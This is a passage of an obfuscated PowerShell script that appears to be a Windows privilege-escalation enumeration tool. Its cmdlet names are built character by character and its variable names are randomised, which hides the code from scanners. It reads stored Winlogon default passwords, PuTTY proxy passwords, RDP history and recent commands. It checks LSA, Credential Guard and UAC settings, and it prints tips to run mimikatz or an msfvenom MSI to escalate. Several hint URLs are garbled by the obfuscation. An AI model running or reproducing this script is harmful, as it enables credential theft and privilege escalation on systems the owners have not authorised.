  1 { &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "RunAsPPL: 1. Enabled with UEFI Lock" }
  0 { &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "RunAsPPL: 0. LSA Protection Disabled. Try mimikatz." -ForegroundColor red }
  Default { "The system was unable to find the specified registry value: RunAsPPL / RunAsPPLBoot" }
}
if ($FcxXHaYVstkujkEdVZKuaIyRtkLgvCFnKrkAuBwSJyZToGUyAmOKetWkIKtVignYveDFUfMRUIcoGzFWAtdYnnmganLaWrpNKUNH) { &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "RunAsPPLBoot: $FcxXHaYVstkujkEdVZKuaIyRtkLgvCFnKrkAuBwSJyZToGUyAmOKetWkIKtVignYveDFUfMRUIcoGzFWAtdYnnmganLaWrpNKUNH" }

 
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| Credential Guard Check"
$BwtAUZXodjXweJzaOiQMSmXGpkSVHoOztfraBdILjjTfVDkuMlAMYphnyAzaKrJHzLlUgIQyjeUhVINWhrVIRhpHUHXlNwFCBMtB = (&('G' + 'e' + 't' + '-' + 'I' + 't' + 'e' + 'm' + 'P' + 'r' + 'o' + 'p' + 'e' + 'r' + 't' + 'y') HKLM:\SYSTEM\CurrentControlSet\Control\LSA).LsaCfgFlags
switch ($BwtAUZXodjXweJzaOiQMSmXGpkSVHoOztfraBdILjjTfVDkuMlAMYphnyAzaKrJHzLlUgIQyjeUhVINWhrVIRhpHUHXlNwFCBMtB) {
  2 { &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "LsaCfgFlags 2. Enabled without UEFI Lock" }
  1 { &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "LsaCfgFlags 1. Enabled with UEFI Lock" }
  0 { &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "LsaCfgFlags 0. LsaCfgFlags Disabled." -ForegroundColor red }
  Default { "The system was unable to find the specified registry value: LsaCfgFlags" }
}

 
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| Cached WinLogon Credentials Check"
if (&('T' + 'e' + 's' + 't' + '-' + 'P' + 'a' + 't' + 'h') "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon") {
  (&('G' + 'e' + 't' + '-' + 'I' + 't' + 'e' + 'm' + 'P' + 'r' + 'o' + 'p' + 'e' + 'r' + 't' + 'y') "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "CACHEDLOGONSCOUNT").CACHEDLOGONSCOUNT
  &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "However, only the SYSTEM user can view the credentials here: HKEY_LOCAL_MACHINE\SECURITY\Cache"
  &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "Or, using mimikatz lsadump::cache"
}

&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| Additonal Winlogon Credentials Check"

(&('G' + 'e' + 't' + '-' + 'I' + 't' + 'e' + 'm' + 'P' + 'r' + 'o' + 'p' + 'e' + 'r' + 't' + 'y') "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon").DefaultDomainName
(&('G' + 'e' + 't' + '-' + 'I' + 't' + 'e' + 'm' + 'P' + 'r' + 'o' + 'p' + 'e' + 'r' + 't' + 'y') "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon").DefaultUserName
(&('G' + 'e' + 't' + '-' + 'I' + 't' + 'e' + 'm' + 'P' + 'r' + 'o' + 'p' + 'e' + 'r' + 't' + 'y') "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon").DefaultPassword
(&('G' + 'e' + 't' + '-' + 'I' + 't' + 'e' + 'm' + 'P' + 'r' + 'o' + 'p' + 'e' + 'r' + 't' + 'y') "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon").AltDefaultDomainName
(&('G' + 'e' + 't' + '-' + 'I' + 't' + 'e' + 'm' + 'P' + 'r' + 'o' + 'p' + 'e' + 'r' + 't' + 'y') "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon").AltDefaultUserName
(&('G' + 'e' + 't' + '-' + 'I' + 't' + 'e' + 'm' + 'P' + 'r' + 'o' + 'p' + 'e' + 'r' + 't' + 'y') "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon").AltDefaultPassword


&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| RDCMan Settings Check"

if (&('T' + 'e' + 's' + 't' + '-' + 'P' + 'a' + 't' + 'h') "$XQliEydMNlmTlvXtzFzbYpoDAfKdoUSFpJJQzELLTNVRaqIenvmXNaKUUtqGhKqVeHIAejMMZUPjIGPKDIWeRrgcSKqpqmGFLYSg:USERPROFILE\appdata\Local\Microsoft\Remote Desktop Connection Manager\RDCMan.settings") {
  &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "RDCMan Settings Found at: $($XQliEydMNlmTlvXtzFzbYpoDAfKdoUSFpJJQzELLTNVRaqIenvmXNaKUUtqGhKqVeHIAejMMZUPjIGPKDIWeRrgcSKqpqmGFLYSg:USERPROFILE)\appdata\Local\Microsoft\Remote Desktop Connection Manager\RDCMan.settings" -ForegroundColor Red
}
else { &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "No RDCMan.Settings found." }


&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| RDP Saved Connections Check"

&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "HK_Users"
&('N' + 'e' + 'w' + '-' + 'P' + 'S' + 'D' + 'r' + 'i' + 'v' + 'e') -PSProvider Registry -Name HKU -Root HKEY_USERS -ErrorAction SilentlyContinue
&('G' + 'e' + 't' + '-' + 'C' + 'h' + 'i' + 'l' + 'd' + 'I' + 't' + 'e' + 'm') HKU:\ -ErrorAction SilentlyContinue | &('F' + 'o' + 'r' + 'E' + 'a' + 'c' + 'h' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') {
  $YNDPkKaqLKvXyjCplTZoubHBDwuiuELiohvIwFwLAzlOaTfnnwNSbDvCVEaevXSfQXENExadOTpRTyFDyaXEoEOSOvMlOkhlEcyN = $_.Name.Replace('HKEY_USERS\', "")
  if (&('T' + 'e' + 's' + 't' + '-' + 'P' + 'a' + 't' + 'h') "registry::HKEY_USERS\$YNDPkKaqLKvXyjCplTZoubHBDwuiuELiohvIwFwLAzlOaTfnnwNSbDvCVEaevXSfQXENExadOTpRTyFDyaXEoEOSOvMlOkhlEcyN\Software\Microsoft\Terminal Server Client\Default") {
    &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "Server Found: $((&('G' + 'e' + 't' + '-' + 'I' + 't' + 'e' + 'm' + 'P' + 'r' + 'o' + 'p' + 'e' + 'r' + 't' + 'y') "registry::HKEY_USERS\$YNDPkKaqLKvXyjCplTZoubHBDwuiuELiohvIwFwLAzlOaTfnnwNSbDvCVEaevXSfQXENExadOTpRTyFDyaXEoEOSOvMlOkhlEcyN\Software\Microsoft\Terminal Server Client\Default" -Name MRU0).MRU0)"
  }
  else { &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "Not found for $($_.Name)" }
}

&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "HKCU"
if (&('T' + 'e' + 's' + 't' + '-' + 'P' + 'a' + 't' + 'h') "registry::HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default") {
  &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "Server Found: $((&('G' + 'e' + 't' + '-' + 'I' + 't' + 'e' + 'm' + 'P' + 'r' + 'o' + 'p' + 'e' + 'r' + 't' + 'y') "registry::HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" -Name MRU0).MRU0)"
}
else { &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "Terminal Server Client not found in HCKU" }

&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| Putty Stored Credentials Check"

if (&('T' + 'e' + 's' + 't' + '-' + 'P' + 'a' + 't' + 'h') HKCU:\SOFTWARE\SimonTatham\PuTTY\Sessions) {
  &('G' + 'e' + 't' + '-' + 'C' + 'h' + 'i' + 'l' + 'd' + 'I' + 't' + 'e' + 'm') HKCU:\SOFTWARE\SimonTatham\PuTTY\Sessions | &('F' + 'o' + 'r' + 'E' + 'a' + 'c' + 'h' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') {
    $ZIHcvcwOALeCJeoVsinZkCSJHrqOFRBAQuxBBrhTXdaQCCLJUXxKWGFjgfpVrKuwIXCUPDcimeRujkIjMHxNKeGGIZgjMNfYvkFp = &('S' + 'p' + 'l' + 'i' + 't' + '-' + 'P' + 'a' + 't' + 'h') $_.Name -Leaf
    &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "Key: $ZIHcvcwOALeCJeoVsinZkCSJHrqOFRBAQuxBBrhTXdaQCCLJUXxKWGFjgfpVrKuwIXCUPDcimeRujkIjMHxNKeGGIZgjMNfYvkFp"
    @("HostName", "PortNumber", "UserName", "PublicKeyFile", "PortForwardings", "ConnectionSharing", "ProxyUsername", "ProxyPassword") | &('F' + 'o' + 'r' + 'E' + 'a' + 'c' + 'h' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') {
      &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "$_ :"
      &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "$((&('G' + 'e' + 't' + '-' + 'I' + 't' + 'e' + 'm' + 'P' + 'r' + 'o' + 'p' + 'e' + 'r' + 't' + 'y')  HKCU:\SOFTWARE\SimonTatham\PuTTY\Sessions\$ZIHcvcwOALeCJeoVsinZkCSJHrqOFRBAQuxBBrhTXdaQCCLJUXxKWGFjgfpVrKuwIXCUPDcimeRujkIjMHxNKeGGIZgjMNfYvkFp).$_)"
    }
  }
}
else { &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "No putty credentials found in HKCU:\SOFTWARE\SimonTatham\PuTTY\Sessions" }


&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| SSH Key Checks"
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| If found:"
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "https://blog.ropnop.com/&('e' + 'x' + 't' + 'r' + 'a' + 'c' + 't' + 'i' + 'n' + 'g' + '-' + 's' + 's' + 'h')-&('p' + 'r' + 'i' + 'v' + 'a' + 't' + 'e' + '-' + 'k' + 'e' + 'y' + 's')-&('f' + 'r' + 'o' + 'm' + '-' + 'w' + 'i' + 'n' + 'd' + 'o' + 'w' + 's')-10-&('s' + 's' + 'h' + '-' + 'a' + 'g' + 'e' + 'n' + 't')/" -ForegroundColor Yellow
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| Checking Putty SSH KNOWN HOSTS"
if (&('T' + 'e' + 's' + 't' + '-' + 'P' + 'a' + 't' + 'h') HKCU:\Software\SimonTatham\PuTTY\SshHostKeys) { 
  &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "$((&('G' + 'e' + 't' + '-' + 'I' + 't' + 'e' + 'm') -Path HKCU:\Software\SimonTatham\PuTTY\SshHostKeys).Property)"
}
else { &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "No putty ssh keys found" }


&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| Checking for OpenSSH Keys"
if (&('T' + 'e' + 's' + 't' + '-' + 'P' + 'a' + 't' + 'h') HKCU:\Software\OpenSSH\Agent\Keys) { &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "OpenSSH keys found. Try this for decryption: https://github.com/ropnop/windows_sshagent_extract" -ForegroundColor Yellow }
else { &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "No OpenSSH Keys found." }


&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| Checking for WinVNC Passwords"
if (&('T' + 'e' + 's' + 't' + '-' + 'P' + 'a' + 't' + 'h') "HKCU:\Software\ORL\WinVNC3\Password") { &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') " WinVNC found at HKCU:\Software\ORL\WinVNC3\Password" }else { &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "No WinVNC found." }


&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| Checking for SNMP Passwords"
if (&('T' + 'e' + 's' + 't' + '-' + 'P' + 'a' + 't' + 'h') "HKLM:\SYSTEM\CurrentControlSet\Services\SNMP") { &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "SNMP Key found at HKLM:\SYSTEM\CurrentControlSet\Services\SNMP" }else { &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "No SNMP found." }


&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| Checking for TightVNC Passwords"
if (&('T' + 'e' + 's' + 't' + '-' + 'P' + 'a' + 't' + 'h') "HKCU:\Software\TightVNC\Server") { &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "TightVNC key found at HKCU:\Software\TightVNC\Server" }else { &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "No TightVNC found." }


&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| UAC Settings"
if ((&('G' + 'e' + 't' + '-' + 'I' + 't' + 'e' + 'm' + 'P' + 'r' + 'o' + 'p' + 'e' + 'r' + 't' + 'y') HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).EnableLUA -eq 1) {
  &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "EnableLUA is equal to 1. Part or all of the UAC components are on."
  &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "https://book.hacktricks.wiki/en/&('w' + 'i' + 'n' + 'd' + 'o' + 'w' + 's' + '-' + 'h' + 'a' + 'r' + 'd' + 'e' + 'n' + 'i' + 'n' + 'g')/&('a' + 'u' + 't' + 'h' + 'e' + 'n' + 't' + 'i' + 'c' + 'a' + 't' + 'i' + 'o' + 'n' + '-' + 'c' + 'r' + 'e' + 'd' + 'e' + 'n' + 't' + 'i' + 'a' + 'l' + 's')-&('u' + 'a' + 'c' + '-' + 'a' + 'n' + 'd')-efs/&('u' + 'a' + 'c' + '-' + 'u' + 's' + 'e' + 'r')-&('a' + 'c' + 'c' + 'o' + 'u' + 'n' + 't' + '-' + 'c' + 'o' + 'n' + 't' + 'r' + 'o' + 'l').html#&('v' + 'e' + 'r' + 'y' + '-' + 'b' + 'a' + 's' + 'i' + 'c')-&('u' + 'a' + 'c' + '-' + 'b' + 'y' + 'p' + 'a' + 's' + 's')-&('f' + 'u' + 'l' + 'l' + '-' + 'f' + 'i' + 'l' + 'e')-&('s' + 'y' + 's' + 't' + 'e' + 'm' + '-' + 'a' + 'c' + 'c' + 'e' + 's' + 's')" -ForegroundColor Yellow
}
else { &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "EnableLUA value not equal to 1" }


&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| Recently Run Commands (WIN+R)"

&('G' + 'e' + 't' + '-' + 'C' + 'h' + 'i' + 'l' + 'd' + 'I' + 't' + 'e' + 'm') HKU:\ -ErrorAction SilentlyContinue | &('F' + 'o' + 'r' + 'E' + 'a' + 'c' + 'h' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') {
  $YNDPkKaqLKvXyjCplTZoubHBDwuiuELiohvIwFwLAzlOaTfnnwNSbDvCVEaevXSfQXENExadOTpRTyFDyaXEoEOSOvMlOkhlEcyN = $_.Name.Replace('HKEY_USERS\', "")
  $fleGFJSdMHgKGhBfLAouHLmzjKxkzniGNnOovGUaDFyyMwoxyNZoAtVwJdXmlgowckGkqaQticoihKPYdjwfcJgXCkqCIURKNhNv = (&('G' + 'e' + 't' + '-' + 'I' + 't' + 'e' + 'm') "HKU:\$_\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -ErrorAction SilentlyContinue).Property
  $YNDPkKaqLKvXyjCplTZoubHBDwuiuELiohvIwFwLAzlOaTfnnwNSbDvCVEaevXSfQXENExadOTpRTyFDyaXEoEOSOvMlOkhlEcyN | &('F' + 'o' + 'r' + 'E' + 'a' + 'c' + 'h' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') {
    if (&('T' + 'e' + 's' + 't' + '-' + 'P' + 'a' + 't' + 'h') "HKU:\$_\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU") {
      &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========||HKU Recently Run Commands"
      foreach ($cpEAPYsWFjshIzbtBAvuUinsyVDvIeLzOnxQZybYNntvcpxLqeDpbaYQCtWDmimplnCroPjlCpoPwlCnqcumKicxLeYvKwcvPrHt in $fleGFJSdMHgKGhBfLAouHLmzjKxkzniGNnOovGUaDFyyMwoxyNZoAtVwJdXmlgowckGkqaQticoihKPYdjwfcJgXCkqCIURKNhNv) {
        &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "$((&('G' + 'e' + 't' + '-' + 'I' + 't' + 'e' + 'm') "HKU:\$_\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -ErrorAction SilentlyContinue).getValue($cpEAPYsWFjshIzbtBAvuUinsyVDvIeLzOnxQZybYNntvcpxLqeDpbaYQCtWDmimplnCroPjlCpoPwlCnqcumKicxLeYvKwcvPrHt))" 
      }
    }
  }
}


&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========||HKCU Recently Run Commands"
$fleGFJSdMHgKGhBfLAouHLmzjKxkzniGNnOovGUaDFyyMwoxyNZoAtVwJdXmlgowckGkqaQticoihKPYdjwfcJgXCkqCIURKNhNv = (&('G' + 'e' + 't' + '-' + 'I' + 't' + 'e' + 'm') "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -ErrorAction SilentlyContinue).Property
foreach ($cpEAPYsWFjshIzbtBAvuUinsyVDvIeLzOnxQZybYNntvcpxLqeDpbaYQCtWDmimplnCroPjlCpoPwlCnqcumKicxLeYvKwcvPrHt in $fleGFJSdMHgKGhBfLAouHLmzjKxkzniGNnOovGUaDFyyMwoxyNZoAtVwJdXmlgowckGkqaQticoihKPYdjwfcJgXCkqCIURKNhNv) {
  &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "$((&('G' + 'e' + 't' + '-' + 'I' + 't' + 'e' + 'm') "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -ErrorAction SilentlyContinue).getValue($cpEAPYsWFjshIzbtBAvuUinsyVDvIeLzOnxQZybYNntvcpxLqeDpbaYQCtWDmimplnCroPjlCpoPwlCnqcumKicxLeYvKwcvPrHt))"
}


&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| Always Install Elevated Check"
 
 
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "Checking Windows Installer Registry (will populate if the key exists)"
if ((&('G' + 'e' + 't' + '-' + 'I' + 't' + 'e' + 'm' + 'P' + 'r' + 'o' + 'p' + 'e' + 'r' + 't' + 'y') HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer -ErrorAction SilentlyContinue).AlwaysInstallElevated -eq 1) {
  &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer).AlwaysInstallElevated = 1" -ForegroundColor red
  &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "Try msfvenom msi package to escalate" -ForegroundColor red
  &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "https://book.hacktricks.wiki/en/&('w' + 'i' + 'n' + 'd' + 'o' + 'w' + 's' + '-' + 'h' + 'a' + 'r' + 'd' + 'e' + 'n' + 'i' + 'n' + 'g')/&('w' + 'i' + 'n' + 'd' + 'o' + 'w' + 's' + '-' + 'l' + 'o' + 'c' + 'a' + 'l')-&('p' + 'r' + 'i' + 'v' + 'i' + 'l' + 'e' + 'g' + 'e' + '-' + 'e' + 's' + 'c' + 'a' + 'l' + 'a' + 't' + 'i' + 'o' + 'n')/index.html#&('m' + 'e' + 't' + 'a' + 's' + 'p' + 'l' + 'o' + 'i' + 't' + '-' + 'p' + 'a' + 'y' + 'l' + 'o' + 'a' + 'd' + 's')" -ForegroundColor Yellow
}
 
if ((&('G' + 'e' + 't' + '-' + 'I' + 't' + 'e' + 'm' + 'P' + 'r' + 'o' + 'p' + 'e' + 'r' + 't' + 'y') HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer -ErrorAction SilentlyContinue).AlwaysInstallElevated -eq 1) { 
  &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer).AlwaysInstallElevated = 1" -ForegroundColor red
  &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "Try msfvenom msi package to escalate" -ForegroundColor red
  &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "https://book.hacktricks.wiki/en/&('w' + 'i' + 'n' + 'd' + 'o' + 'w' + 's' + '-' + 'h' + 'a' + 'r' + 'd' + 'e' + 'n' + 'i' + 'n' + 'g')/&('w' + 'i' + 'n' + 'd' + 'o' + 'w' + 's' + '-' + 'l' + 'o' + 'c' + 'a' + 'l')-&('p' + 'r' + 'i' + 'v' + 'i' + 'l' + 'e' + 'g' + 'e' + '-' + 'e' + 's' + 'c' + 'a' + 'l' + 'a' + 't' + 'i' + 'o' + 'n')/index.html#&('m' + 'e' + 't' + 'a' + 's' + 'p' + 'l' + 'o' + 'i' + 't' + '-' + 'p' + 'a' + 'y' + 'l' + 'o' + 'a' + 'd' + 's')" -ForegroundColor Yellow
}


&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| PowerShell Info"

(&('G' + 'e' + 't' + '-' + 'I' + 't' + 'e' + 'm' + 'P' + 'r' + 'o' + 'p' + 'e' + 'r' + 't' + 'y') registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine).PowerShellVersion | &('F' + 'o' + 'r' + 'E' + 'a' + 'c' + 'h' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') {
  &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "PowerShell $_ available"
}
(&('G' + 'e' + 't' + '-' + 'I' + 't' + 'e' + 'm' + 'P' + 'r' + 'o' + 'p' + 'e' + 'r' + 't' + 'y') registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\3\PowerShellEngine).PowerShellVersion | &('F' + 'o' + 'r' + 'E' + 'a' + 'c' + 'h' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') {
  &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't')  "PowerShell $_ available"
}


&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| PowerShell Registry Transcript Check"

if (&('T' + 'e' + 's' + 't' + '-' + 'P' + 'a' + 't' + 'h') HKCU:\Software\Policies\Microsoft\Windows\PowerShell\Transcription) {
  &('G' + 'e' + 't' + '-' + 'I' + 't' + 'e' + 'm') HKCU:\Software\Policies\Microsoft\Windows\PowerShell\Transcription
}
if (&('T' + 'e' + 's' + 't' + '-' + 'P' + 'a' + 't' + 'h') HKLM:\Software\Policies\Microsoft\Windows\PowerShell\Transcription) {
  &('G' + 'e' + 't' + '-' + 'I' + 't' + 'e' + 'm') HKLM:\Software\Policies\Microsoft\Windows\PowerShell\Transcription
}
if (&('T' + 'e' + 's' + 't' + '-' + 'P' + 'a' + 't' + 'h') HKCU:\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription) {
  &('G' + 'e' + 't' + '-' + 'I' + 't' + 'e' + 'm') HKCU:\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
}
if (&('T' + 'e' + 's' + 't' + '-' + 'P' + 'a' + 't' + 'h') HKLM:\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription) {
  &('G' + 'e' + 't' + '-' + 'I' + 't' + 'e' + 'm') HKLM:\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
}
 

&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| PowerShell Module Log Check"
if (&('T' + 'e' + 's' + 't' + '-' + 'P' + 'a' + 't' + 'h') HKCU:\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging) {
  &('G' + 'e' + 't' + '-' + 'I' + 't' + 'e' + 'm') HKCU:\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
}
